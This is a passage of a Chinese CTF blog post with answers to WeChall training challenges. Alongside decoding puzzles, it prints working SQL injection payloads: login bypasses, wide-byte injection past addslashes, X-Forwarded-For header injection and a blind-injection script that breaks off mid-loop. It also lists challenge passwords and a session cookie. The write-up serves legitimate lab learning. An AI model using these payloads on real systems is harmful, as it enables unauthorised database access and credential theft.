<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/4/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-CTF-wp-wechall答案" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/" class="article-date">
  <time class="dt-published" datetime="2021-01-24T07:38:22.000Z" itemprop="datePublished">2021-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/">wechall答案</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Training-Get-Sourced"><a href="#Training-Get-Sourced" class="headerlink" title="Training: Get Sourced"></a>Training: Get Sourced</h1><p>看源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- You are looking for this password: html_sourcecode --&gt;     </span><br></pre></td></tr></table></figure>
<p>提交html_sourcecode即可</p>
<h1 id="Training-Stegano"><a href="#Training-Stegano" class="headerlink" title="Training: Stegano"></a>Training: Stegano</h1><p>工具：winhex</p>
<p>将图片拖拽到winhex中</p>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Look what the hex-edit revealed: passwd:steganoI</span><br></pre></td></tr></table></figure>
<p>提交steganoI</p>
<h1 id="Training-Crypto-Caesar"><a href="#Training-Crypto-Caesar" class="headerlink" title="Training: Crypto - Caesar"></a>Training: Crypto - Caesar</h1><p>考察凯撒密码</p>
<p>由于每次出来的字符串都不一样，所以把位移数26遍历了一遍，找到其中有实际意义的那一行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str1 &#x3D; &quot;AOL XBPJR IYVDU MVE QBTWZ VCLY AOL SHGF KVN VM JHLZHY HUK FVBY BUPXBL ZVSBAPVU PZ WPHLPYYJYVOO&quot;</span><br><span class="line">str2 &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(26):</span><br><span class="line">	for s in str1:</span><br><span class="line">		if s !&#x3D; &quot; &quot;:</span><br><span class="line">			num &#x3D; (ord(s) - ord(&#39;A&#39;) + i) % 26</span><br><span class="line">			str2 +&#x3D; chr(ord(&#39;A&#39;)+num)</span><br><span class="line">		else:</span><br><span class="line">			str2 +&#x3D; s</span><br><span class="line">	print(str2)</span><br><span class="line">	str2 &#x3D; &quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training: WWW-Robots"></a>Training: WWW-Robots</h1><p>考察robots.txt</p>
<p>没想到直接放到根目录底下了。。。</p>
<p>访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wechall.net&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;challenge&#x2F;training&#x2F;www&#x2F;robots&#x2F;T0PS3CR3T</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>
<p>访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wechall.net&#x2F;challenge&#x2F;training&#x2F;www&#x2F;robots&#x2F;T0PS3CR3T</span><br></pre></td></tr></table></figure>
<h1 id="Training-ASCII"><a href="#Training-ASCII" class="headerlink" title="Training ASCII"></a>Training ASCII</h1><p>考察：ASCII码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str1 &#x3D; &quot;84, 104, 101, 32, 115, 111, 108, 117, 116, 105, 111, 110, 32, 105, 115, 58, 32, 111, 109, 105, 104, 112, 115, 115, 104, 108, 97, 110, 112&quot;</span><br><span class="line"></span><br><span class="line">str2 &#x3D; str1.split(&quot;,&quot;)</span><br><span class="line">text &#x3D; &quot;&quot;</span><br><span class="line">for i in str2:</span><br><span class="line">	temp &#x3D; int(i)</span><br><span class="line">	text +&#x3D; chr(temp)</span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The solution is: omihpsshlanp</span><br></pre></td></tr></table></figure>
<h1 id="Encoding-URL"><a href="#Encoding-URL" class="headerlink" title="Encoding: URL"></a>Encoding: URL</h1><p>用firefox的hackbar解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%59%69%70%70%65%68%21%20%59%6F%75%72%20%55%52%4C%20%69%73%20%63%68%61%6C%6C%65%6E%67%65%2F%74%72%61%69%6E%69%6E%67%2F%65%6E%63%6F%64%69%6E%67%73%2F%75%72%6C%2F%73%61%77%5F%6C%6F%74%69%6F%6E%2E%70%68%70%3F%70%3D%73%67%6D%65%67%61%70%62%69%6D%70%61%26%63%69%64%3D%35%32%23%70%61%73%73%77%6F%72%64%3D%66%69%62%72%65%5F%6F%70%74%69%63%73%20%56%65%72%79%20%77%65%6C%6C%20%64%6F%6E%65%21</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yippeh! Your URL is challenge&#x2F;training&#x2F;encodings&#x2F;url&#x2F;saw_lotion.php?p&#x3D;sgmegapbimpa&amp;cid&#x3D;52#password&#x3D;fibre_optics Very well done!</span><br></pre></td></tr></table></figure>
<h1 id="Prime-Factory"><a href="#Prime-Factory" class="headerlink" title="Prime Factory"></a>Prime Factory</h1><p>竟然是算法题。。。</p>
<p>本身为素数，所有数位上的数字和也为素数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">high = <span class="number">1000000</span>+<span class="number">1</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># prime_num = &#123;&quot;2&quot;, &quot;3&quot;, &quot;5&quot;, &quot;7&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validNum</span>(<span class="params">num</span>):</span></span><br><span class="line">	str_num = <span class="built_in">str</span>(num)</span><br><span class="line">	temp = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> s <span class="keyword">in</span> str_num:</span><br><span class="line">		temp += <span class="built_in">int</span>(s)</span><br><span class="line">	<span class="keyword">if</span> validPrime(temp):</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validPrime</span>(<span class="params">num</span>):</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(math.sqrt(num) )+ <span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> num % j == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(high, high * <span class="number">10</span>):</span><br><span class="line">	<span class="keyword">if</span> validPrime(i) <span class="keyword">and</span> validNum(i):</span><br><span class="line">		ans += <span class="built_in">str</span>(i)</span><br><span class="line">		print(i)</span><br><span class="line">		flag += <span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> flag == <span class="number">2</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1000033</span><br><span class="line">1000037</span><br><span class="line">10000331000037</span><br></pre></td></tr></table></figure>
<h1 id="Training-Encoding"><a href="#Training-Encoding" class="headerlink" title="Training: Encoding"></a>Training: Encoding</h1><p>考察：二进制的转换，ASCII码，JPocketKnife</p>
<p>JPocket是用来编码转换的小工具</p>
<p>由于只有01，判断是ASCII码的题</p>
<p>标准ASCII码使用7位二进制数来表示所有大小写字母，数字，标点，特殊控制符（剩余1位为0）</p>
<p>本题要修改BitsPerBlock为7（长度为441，不能被8整除）</p>
<p>![CTF-wp-wechall Training Encoding2](.\pic\CTF-wp-wechall Training Encoding2.png)</p>
<p>![CTF-wp-wechall Training Encoding1](.\pic\CTF-wp-wechall Training Encoding1.png)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This text is 7-bit encoded ascii. Your password is easystarter.</span><br></pre></td></tr></table></figure>


<h2 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h2><p>标准ASCII码使用7位二进制数来表示所有大小写字母，数字，标点，特殊控制符（剩余1位为0）</p>
<h1 id="Training-Programming-1"><a href="#Training-Programming-1" class="headerlink" title="Training: Programming 1"></a>Training: Programming 1</h1><p>考察：python的requests库</p>
<p>拿到访问链接的值，填充到第二个链接访问</p>
<p>由于需要确认访问者身份，因此需要用到cookie</p>
<p>进入到第一个链接，发现cookie如下</p>
<p>![CTF-wp-wechall Training Programming1](.\pic\CTF-wp-wechall Training Programming1.png)</p>
<p>那么就可以构造以下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://www.wechall.net/challenge/training/programming1/index.php?action=request&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://www.wechall.net/challenge/training/programming1/index.php?answer=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">cookie = <span class="built_in">dict</span>(WC=<span class="string">&quot;13191858-57927-oQHWYThmhwmYUy2X&quot;</span>)</span><br><span class="line">resp1 = requests.get(url1, cookies=cookie)</span><br><span class="line">resp2 = requests.get(url2.<span class="built_in">format</span>(resp1.text), cookies=cookie)</span><br><span class="line"></span><br><span class="line">print(resp2.text)</span><br></pre></td></tr></table></figure>
<h1 id="Training-Regex"><a href="#Training-Regex" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^$&#x2F;</span><br></pre></td></tr></table></figure>
<h1 id="Training-MYSQL-I"><a href="#Training-MYSQL-I" class="headerlink" title="Training: MYSQL I"></a>Training: MYSQL I</h1><p>考察：万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; #</span><br><span class="line">password: 123</span><br></pre></td></tr></table></figure>
<p>注意，username处不能写admin’ or 1=1#，因为username在原sql语句中是where的筛选条件</p>
<h1 id="Training-MYSQL-II"><a href="#Training-MYSQL-II" class="headerlink" title="Training: MYSQL II"></a>Training: MYSQL II</h1><p>考察：账号密码分开验证时，MYSQL登陆的绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: -1&#39; union select 1,&#39;admin&#39;,md5(&#39;password&#39;) #</span><br><span class="line">password: password</span><br></pre></td></tr></table></figure>
<h1 id="No-Escape"><a href="#No-Escape" class="headerlink" title="No Escape"></a>No Escape</h1><p>考察：PHP代码审计，mysql的反引号</p>
<p>观察可知，URL处的vote变量即每次提交button时加1的变量，猜测可在URL出注入</p>
<p>阅读源码，直接跳到sql语句一处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;UPDATE noescvotes SET &#96;$who&#96;&#x3D;&#96;$who&#96;+1 WHERE id&#x3D;1&quot;;</span><br></pre></td></tr></table></figure>
<p>故payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.wechall.net&#x2F;challenge&#x2F;no_escape&#x2F;index.php?vote_for&#x3D;bill&#96;&#x3D;111--+</span><br></pre></td></tr></table></figure>
<p>注意此处为反引号，因为原sql语句就是反引号</p>
<h2 id="mysql中的单引号、双引号、反引号"><a href="#mysql中的单引号、双引号、反引号" class="headerlink" title="mysql中的单引号、双引号、反引号"></a>mysql中的单引号、双引号、反引号</h2><p>单双引号用法相同，是使用字符串时使用的符号</p>
<p>反引号用于区分mysql中的保留字符和普通字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#假如表A中有一列名为select，查询该列</span><br><span class="line">select select from A;   #错误</span><br><span class="line">select &#96;select&#96; from A;  #正确</span><br></pre></td></tr></table></figure>
<h1 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h1><p>考察：宽字节注入<br>由于编码为gbk，且使用了addslashes过滤username处的单引号，使用宽字节注入</p>
<p>由于原sql语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;SELECT username FROM users WHERE username&#x3D;&#39;$username&#39; AND password&#x3D;&#39;$password&#39;&quot;;</span><br></pre></td></tr></table></figure>
<p>使用宽字节注入以后，语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM users WHERE username&#x3D;&#39;admin 运&#39; # AND password&#x3D;&#39;password&#39;</span><br></pre></td></tr></table></figure>
<p>因此，还要再从数据库中选出username，因此有了如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.wechall.net&#x2F;challenge&#x2F;addslashes&#x2F;index.php?username&#x3D;admin+%Df%27+union+select+username+from+users+limit+1,1+%23&amp;password&#x3D;123&amp;login&#x3D;%E6%B3%A8%E5%86%8C</span><br></pre></td></tr></table></figure>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p><strong>参考</strong></p>
<p>​    <a target="_blank" rel="noopener" href="https://blog.csdn.net/heiseweiye/article/details/82723478">https://blog.csdn.net/heiseweiye/article/details/82723478</a></p>
<p><strong>条件</strong></p>
<p>​    编码为gbk</p>
<p><strong>用法</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;1</span><br><span class="line">select * from user where  id &#x3D;&#39;1\&#39; and 1&#x3D;1#&#39;</span><br><span class="line">	id&#x3D;1&#39; and 1&#x3D;1%23</span><br><span class="line">select * from user where id &#x3D;&#39;1運&#39; and 1&#x3D;1#&#39;</span><br><span class="line">	id&#x3D;1%df&#39; and 1&#x3D;1%23</span><br></pre></td></tr></table></figure>
<p><strong>原理</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GBK为多字节编码，两个字节代表一个汉字，此时%DF与后面的&#x2F;，也就是%5c变成了一个汉字</span><br></pre></td></tr></table></figure>
<h1 id="The-Guestbook"><a href="#The-Guestbook" class="headerlink" title="The Guestbook"></a>The Guestbook</h1><p>考察：X-Forwarded-For注入</p>
<p>上来搜$query语句，总共有下面这些</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;DELETE FROM gbook_book WHERE gbb_time&lt;$cut&quot;;</span><br><span class="line">$query &#x3D; &quot;INSERT INTO gbook_book VALUES(&#39;$playerid&#39;, $userid, $time, &#39;$ip&#39;, &#39;$message&#39;)&quot;; </span><br><span class="line">$query &#x3D; &quot;DELETE FROM gbook_book WHERE gbb_sessid&#x3D;&#39;$playerid&#39;&quot;;</span><br><span class="line">$query &#x3D; &quot;SELECT * FROM gbook_book WHERE gbb_sessid&#x3D;&#39;$playerid&#39;&quot;;</span><br></pre></td></tr></table></figure>
<p>只有第2和4句有注入可能</p>
<p>先看第4句，深入找一下playerid的地方，最终溯源到gbook_playerID，这个再往前找，是SESSION_ID。跳过</p>
<p>看第2句，这五个变量来源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$playerid &#x3D; gbook_playerID(true); &#x2F;&#x2F; Current Player</span><br><span class="line">$userid &#x3D; 0; # guestbook has no login yet.</span><br><span class="line">$time &#x3D; time();</span><br><span class="line">$ip &#x3D; gbook_getIP();</span><br><span class="line">$message &#x3D; GDO::escape($message); </span><br></pre></td></tr></table></figure>
<p>溯源以后发现只有ip有注入可能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function gbook_getIP()</span><br><span class="line">&#123;</span><br><span class="line">        if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">                return $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">        elseif (isset($_SERVER[&#39;HTTP_VIA&#39;])) &#123; </span><br><span class="line">                return $_SERVER[&#39;HTTP_VIA&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">                return $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>X-Forwarded-For注入，改一下包就完事了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1&#39;,(SELECT gbu_password FROM gbook_user WHERE gbu_name&#x3D;&#39;Admin&#39;));#</span><br></pre></td></tr></table></figure>
<p>得到密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TheBrownFoxAndTheLazyDog</span><br></pre></td></tr></table></figure>
<h1 id="MD5-salt"><a href="#MD5-salt" class="headerlink" title="MD5.salt"></a>MD5.salt</h1><p>考察：md5，回显注入</p>
<p>参考：<a target="_blank" rel="noopener" href="http://rk700.github.io/2014/06/17/md5-salt/">http://rk700.github.io/2014/06/17/md5-salt/</a></p>
<p>抓包，是post提交</p>
<p>尝试username：admin’，有回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GDO Error(1064): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;admin&#39;&#39;&#39; at line 1</span><br><span class="line">SELECT * FROM users WHERE username&#x3D;&#39;admin&#39;&#39;</span><br></pre></td></tr></table></figure>
<p>故尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello Admin... checking your credentials...</span><br></pre></td></tr></table></figure>
<p>用户名Admin的值是回显的，把password传给Admin的文职</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;-1&#39; union select password,3 from users where username&#x3D;&#39;Admin&#39;#</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello 215c61d0104f8925b5f7e4e87a7cbdfa... checking your credentials...</span><br></pre></td></tr></table></figure>
<p>然后需要破解MD5的工具，网上没有现成答案也没有免费的，跳过</p>
<p>等等</p>
<p>参考链接的wp没看懂怎么操作的，但是通过空密码用户去套取salt的方式值得参考</p>
<h1 id="Table-Names"><a href="#Table-Names" class="headerlink" title="Table Names"></a>Table Names</h1><p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>可进入</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39;#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>得到同样信息，说明是可注入的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39; and 1&#x3D;1#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>同样通过，那么可以使用布尔盲注或者updatexml</p>
<p>优先选择updatexml，比较方便</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39; and updatexml(1,concat(0x7e,(database(),0x7e),1)#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>只有报错，没有回显</p>
<p>尝试语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39; and if(1&#x3D;1,1,2)&#x3D;1#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>能够登陆</p>
<p>盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.wechall.net/challenge/table_names/challenge.php?username=test&#x27;+and+if(&#123;&#125;,1,2)=1%23&amp;password=test&amp;login=login&quot;</span></span><br><span class="line"></span><br><span class="line">success = <span class="string">&quot;Welcome back test&quot;</span></span><br><span class="line">payload1 = <span class="string">&quot;ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line">db_name = <span class="string">&quot;&quot;</span></span><br><span class="line">tb_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(1, 60):</span></span><br><span class="line"><span class="comment"># 	low = 32</span></span><br><span class="line"><span class="comment"># 	high = 128</span></span><br><span class="line"><span class="comment"># 	while low &lt; high:</span></span><br><span class="line"><span class="comment"># 		mid = (low + high) &gt;&gt; 1</span></span><br><span class="line"><span class="comment"># 		payload = payload1.format(i, mid)</span></span><br><span class="line"><span class="comment"># 		resp = requests.get(url.format(payload))</span></span><br><span class="line"><span class="comment"># 		# print(j)</span></span><br><span class="line"><span class="comment"># 		# print(url.format(payload))</span></span><br><span class="line"><span class="comment"># 		# print( resp.text)</span></span><br><span class="line"><span class="comment"># 		if success in resp.text:</span></span><br><span class="line"><span class="comment"># 			low = mid + 1</span></span><br><span class="line"><span class="comment"># 		else:</span></span><br><span class="line"><span class="comment"># 			high = mid</span></span><br><span class="line"><span class="comment"># 	if low == 32 or high == 128:</span></span><br><span class="line"><span class="comment"># 		break</span></span><br><span class="line"><span class="comment"># 	else:</span></span><br><span class="line"><span class="comment"># 		db_name += chr(low)</span></span><br><span class="line"><span class="comment"># 		print(db_name)</span></span><br><span class="line"></span><br><span class="line">db_name = <span class="string">&quot;gizmore_tableu61&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(db_name)</span><br><span class="line">payload3 = <span class="string">&quot;ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	